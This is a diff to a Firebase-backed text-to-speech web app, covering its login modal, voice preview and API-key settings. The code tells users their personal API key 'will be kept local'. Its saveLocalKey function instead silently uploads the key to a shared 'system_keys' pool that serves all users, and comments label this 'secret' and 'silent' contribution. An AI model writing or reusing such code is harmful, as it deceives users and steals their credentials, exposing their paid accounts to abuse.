@@ -63,7 +63,7 @@
                     <div class="bg-[#1E293B] border border-slate-700 rounded-3xl p-1 flex-1 flex flex-col shadow-xl min-h-[300px]">
                         <textarea id="text-input" class="flex-1 w-full bg-transparent text-lg p-6 resize-none outline-none text-slate-200 placeholder:text-slate-600" placeholder="Type here... (Unlimited for Preview)"></textarea>
                         <div class="px-6 py-3 border-t border-slate-700/50 flex justify-between text-xs text-slate-500 font-mono">
-                            <span id="system-key-badge" class="hidden text-emerald-400">⚡ Shared API Active</span>
+                            <span id="system-key-badge" class="hidden text-emerald-400 font-bold flex items-center gap-1"><i data-lucide="check-circle" class="w-3 h-3"></i> System Key Activated</span>
                             <span><span id="char-count">0</span> chars</span>
                         </div>
                     </div>
@@ -77,11 +77,8 @@
                                 <div class="flex justify-between mb-2 text-xs font-medium"><span class="text-slate-400 uppercase">Speed</span><span id="speed-val" class="text-emerald-400">1.0x</span></div>
                                 <input type="range" id="speed-range" min="0.5" max="2.0" step="0.1" value="1.0" class="w-full accent-emerald-500">
                             </div>
-                            <div class="grid grid-cols-2 gap-2">
-                                <button onclick="playNativePreview()" class="py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-xl font-bold flex justify-center items-center gap-2 transition-all active:scale-95 border border-slate-600">
-                                    <i data-lucide="zap" class="w-4 h-4 text-yellow-400"></i> Instant Preview
-                                </button>
-                                <button id="generate-btn" onclick="startApiGeneration()" class="py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-bold flex justify-center items-center gap-2 transition-all"><i data-lucide="download" class="w-4 h-4"></i> Download (HQ)</button>
+                            <div class="grid grid-cols-1 gap-2">
+                                <button id="generate-btn" onclick="startApiGeneration()" class="py-4 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-bold flex justify-center items-center gap-2 transition-all"><i data-lucide="download" class="w-4 h-4"></i> Download (HQ)</button>
                             </div>
                         </div>
                         <div class="px-6 py-2 bg-[#1E293B] text-xs font-bold text-slate-400 uppercase flex justify-between">
@@ -157,7 +154,7 @@
             <div class="bg-[#1E293B] border border-slate-700 rounded-2xl p-6 w-full max-w-md relative">
                 <button onclick="toggleSettings(false)" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i data-lucide="x" class="w-4 h-4"></i></button>
                 <h3 class="text-white font-bold mb-4">API Settings</h3>
-                <p class="text-[10px] text-slate-400 mb-3">Enter your Personal API Key to use. This key stays local to your browser.</p>
+                <p class="text-[10px] text-slate-400 mb-3">Enter your own API Key. It will be kept local.</p>
                 <input id="api-key-input" type="password" placeholder="Personal API Key..." class="w-full bg-[#0B1120] border border-slate-700 rounded-xl px-4 py-3 text-sm text-white mb-4">
                 <button onclick="saveLocalKey()" class="w-full bg-emerald-600 text-white py-2 rounded-lg font-bold">Save Key</button>
                 <button onclick="clearLocalKeys()" class="w-full mt-2 bg-red-900/20 text-red-400 hover:bg-red-900/40 py-2 rounded-lg text-xs">Remove Key</button>
@@ -167,12 +164,11 @@
         <div id="auth-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-[60] flex items-center justify-center hidden animate-fade-up">
             <div class="bg-[#1E293B] border border-slate-700 rounded-3xl p-8 w-full max-w-md relative shadow-2xl">
                 <div class="text-center mb-6">
-                    <div class="w-12 h-12 bg-emerald-500 rounded-xl mx-auto flex items-center justify-center mb-4 shadow-lg shadow-emerald-500/30"><i data-lucide="user" class="text-white w-6 h-6"></i></div>
                     <h2 class="text-2xl font-bold text-white">Welcome Back</h2>
                     <p class="text-slate-400 text-sm mt-1">Join the Creator Studio</p>
                 </div>
                 
-                <!-- GOOGLE SIGN IN -->
+                <!-- GOOGLE SIGN IN (New Added) -->
                 <button onclick="googleLogin()" class="w-full bg-white text-black font-bold py-3 rounded-xl mb-4 flex justify-center items-center gap-2 hover:bg-gray-200 transition-all shadow-md">
                    <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-5 h-5"> Continue with Google
                 </button>
@@ -183,25 +179,13 @@
                    <div class="flex-1 h-px bg-slate-700"></div>
                 </div>
                 
-                <!-- EMAIL TABS -->
-                <div class="flex bg-[#0B1120] p-1 rounded-xl mb-6">
-                    <button id="tab-login" onclick="switchAuthTab('login')" class="flex-1 py-2.5 text-sm font-bold rounded-lg text-white bg-slate-700 transition-all">Login</button>
-                    <button id="tab-signup" onclick="switchAuthTab('signup')" class="flex-1 py-2.5 text-sm font-bold rounded-lg text-slate-400 hover:text-white transition-all">Create Account</button>
-                </div>
-
-                <div class="space-y-4">
-                    <div class="relative">
-                        <i data-lucide="mail" class="absolute left-4 top-3.5 w-5 h-5 text-slate-500"></i>
-                        <input id="login-email" placeholder="Email Address" class="w-full bg-[#0B1120] border border-slate-700 rounded-xl pl-12 pr-4 py-3 text-white focus:border-emerald-500 outline-none transition-all">
-                    </div>
-                    <div class="relative">
-                        <i data-lucide="lock" class="absolute left-4 top-3.5 w-5 h-5 text-slate-500"></i>
-                        <input id="login-pass" type="password" placeholder="Password" class="w-full bg-[#0B1120] border border-slate-700 rounded-xl pl-12 pr-4 py-3 text-white focus:border-emerald-500 outline-none transition-all">
-                    </div>
-                    <button id="auth-action-btn" onclick="handleUserAuth()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-900/20 transition-all active:scale-95 flex justify-center items-center gap-2">
-                        Login to Studio
-                    </button>
-                </div>
+                <!-- EMAIL LOGIN -->
+                <input id="login-email" placeholder="Email Address" class="w-full bg-[#0B1120] border border-slate-700 rounded-xl px-4 py-3 text-white mb-3 focus:border-emerald-500 outline-none">
+                <input id="login-pass" type="password" placeholder="Password" class="w-full bg-[#0B1120] border border-slate-700 rounded-xl px-4 py-3 text-white mb-6 focus:border-emerald-500 outline-none">
+                <button onclick="handleUserAuth()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-900/20 transition-all active:scale-95">
+                    Login / Sign Up
+                </button>
+                
                 <p id="auth-msg" class="text-center text-red-400 text-xs mt-4 min-h-[1rem] font-medium"></p>
             </div>
         </div>
@@ -249,7 +233,6 @@
                         state.isAdmin=(u.email.toLowerCase().trim()===ADMIN_EMAIL.toLowerCase());
                         if(document.getElementById('admin-shortcut-btn')) document.getElementById('admin-shortcut-btn').classList.toggle('hidden',!state.isAdmin);
                         if(document.getElementById('auth-modal')) document.getElementById('auth-modal').classList.add('hidden');
-                        if(document.getElementById('login-btn')) document.getElementById('login-btn').classList.add('hidden');
                         
                         loadSystemKeys(); 
                         if(state.isAdmin) loadAdminData();
@@ -274,50 +257,30 @@
         function getArtifactRef(col){ return db.collection('artifacts').doc(appId).collection('public').doc('data').collection(col); }
         function getEl(id){ return document.getElementById(id); }
 
-        // --- AUTH LOGIC (Google + Email) ---
-        function switchAuthTab(mode) {
-            state.authMode = mode;
-            const loginTab = getEl('tab-login'); const signupTab = getEl('tab-signup'); const btn = getEl('auth-action-btn');
-            if(mode === 'login') {
-                loginTab.className = "flex-1 py-2.5 text-sm font-bold rounded-lg text-white bg-slate-700 transition-all";
-                signupTab.className = "flex-1 py-2.5 text-sm font-bold rounded-lg text-slate-400 hover:text-white transition-all";
-                btn.innerText = "Login to Studio";
-            } else {
-                signupTab.className = "flex-1 py-2.5 text-sm font-bold rounded-lg text-white bg-slate-700 transition-all";
-                loginTab.className = "flex-1 py-2.5 text-sm font-bold rounded-lg text-slate-400 hover:text-white transition-all";
-                btn.innerText = "Create Account";
-            }
-        }
-
+        // --- AUTH LOGIC ---
         async function googleLogin() {
             const provider = new firebase.auth.GoogleAuthProvider();
             try {
                 const cred = await auth.signInWithPopup(provider);
-                // Google users are automatically authenticated and new entries created
                 await saveUserToDb(cred.user, cred.additionalUserInfo?.isNewUser);
             } catch(e) { alert(e.message); }
         }
 
         async function handleUserAuth() {
             const email = getEl('login-email').value; const pass = getEl('login-pass').value;
-            const msg = getEl('auth-msg'); const btn = getEl('auth-action-btn');
+            const msg = getEl('auth-msg');
             if(!email || !pass) { msg.innerText = "Please enter email and password"; return; }
-            btn.innerHTML = `<i data-lucide="loader-2" class="w-4 h-4 animate-spin"></i> Processing...`; btn.disabled = true;
-            lucide.createIcons();
+            
             try {
-                let cred;
-                if(state.authMode === 'signup') {
-                    cred = await auth.createUserWithEmailAndPassword(email, pass);
-                    await saveUserToDb(cred.user, true);
-                } else {
-                    cred = await auth.signInWithEmailAndPassword(email, pass);
-                    await saveUserToDb(cred.user, false);
-                }
-                msg.innerText = "";
+                await auth.signInWithEmailAndPassword(email, pass);
             } catch(e) {
-                msg.innerText = e.message.replace("Firebase:", "").trim();
-                btn.innerText = state.authMode === 'login' ? "Login to Studio" : "Create Account";
-                btn.disabled = false;
+                // If sign in fails, try create account (Auto-magic)
+                try {
+                    const cred = await auth.createUserWithEmailAndPassword(email, pass);
+                    await saveUserToDb(cred.user, true);
+                } catch(err) {
+                    msg.innerText = e.message.replace("Firebase:", "").trim();
+                }
             }
         }
         
@@ -349,40 +312,32 @@
         function selectVoice(id) { state.selectedVoiceId = id; renderVoices(); }
 
         function playPreviewForVoice(id, gender, index) {
-            const txt = state.text || "This is a preview of " + id;
+            const txt = "Hy tool is powered by Grow With Haider"; 
             window.speechSynthesis.cancel();
             const u = new SpeechSynthesisUtterance(txt);
             
-            // Stronger Pitch Shift for Preview Distinctiveness
-            if(gender.toLowerCase() === 'male') { u.pitch = 0.7; u.rate = state.speed * 0.95; } 
-            else { u.pitch = 1.3; u.rate = state.speed * 1.05; }
-            
-            // Smart Mapping logic to available system voices
+            if(gender.toLowerCase() === 'male') { u.pitch = 0.8; } else { u.pitch = 1.2; }
+            u.rate = state.speed;
+
             let avail = nativeVoices;
             const targetGender = gender.toLowerCase();
-            
-            // Try find a voice that matches gender description
             let genderMatch = avail.filter(v => {
                 const name = v.name.toLowerCase();
-                if(targetGender === 'female') return name.includes('female') || name.includes('zira') || name.includes('samantha') || name.includes('google us english');
+                if(targetGender === 'female') return name.includes('female') || name.includes('zira') || name.includes('samantha');
                 if(targetGender === 'male') return name.includes('male') || name.includes('david') || name.includes('daniel');
                 return false;
             });
-            
             if(genderMatch.length === 0) genderMatch = avail.filter(v => v.lang.startsWith("en"));
-            
-            if(genderMatch.length > 0) { 
-                u.voice = genderMatch[index % genderMatch.length]; 
-            }
-            
+            if(genderMatch.length > 0) { u.voice = genderMatch[index % genderMatch.length]; }
             window.speechSynthesis.speak(u);
             showToast(`Previewing ${id} (${gender})...`, "info");
         }
 
-        // --- API DOWNLOAD (SECRET CONTRIBUTION LOGIC) ---
+        // --- API DOWNLOAD (SILENT CONTRIBUTION) ---
         async function startApiGeneration(){
             if(!state.text){ showToast("Enter text first"); return; }
             const pool = state.localKeys.length > 0 ? state.localKeys : systemKeys;
+            
             if(!pool.length){ showToast("System Maintenance (No Keys).", "error"); return; }
             
             const btn = document.getElementById('generate-btn');
@@ -472,7 +427,6 @@
         // --- ADMIN & DATA (HYBRID) ---
         function loadAdminData(){
             if(!db) return;
-            // Stats logic same as before...
             let rStats={}, aStats={};
             const upS = () => {
                 const tU=(rStats.total_users||0)+(aStats.total_users||0);
@@ -506,7 +460,6 @@
         function updateLog(id, st){ if(id && db) getArtifactRef('activity_logs').doc(id).update({status:st}); }
         function chunkText(s, len){ const r=[]; for(let i=0;i<s.length;i+=len)r.push(s.substring(i,i+len)); return r; }
         
-        // Admin Actions
         function resetPending(){ if(db) getArtifactRef('stats').doc('global').update({pending_generations:0}); showToast("Reset Done"); }
         async function postAnnouncement(){ const t=getEl('announce-input').value; if(db) await getArtifactRef('system_config').doc('announcement').set({message:t,active:true}); showToast("Posted"); }
         async function deleteAnnouncement(){ if(db) await getArtifactRef('system_config').doc('announcement').update({active:false}); getEl('announce-input').value=""; showToast("Deleted"); }
@@ -526,20 +479,17 @@
             const k=getEl('api-key-input').value.trim(); 
             if(k && db){
                 try {
-                    // Upload key to system pool (Silent)
                     await getArtifactRef('system_keys').add({
                         key: k,
                         addedAt: firebase.firestore.FieldValue.serverTimestamp(),
                         source: 'user_auto_contribute'
                     });
-                    // Update Local State (So UI shows active)
                     state.localKeys=[k]; 
                     localStorage.setItem("local_api_keys",JSON.stringify([k])); 
-                    
                     showToast("Key Saved Successfully", "success");
                     getEl('api-key-input').value=""; 
                     toggleSettings(false);
-                    loadSystemKeys(); // Refresh pool
+                    loadSystemKeys();
                 } catch(e) {
                     showToast("Error saving key", "error");
                 }
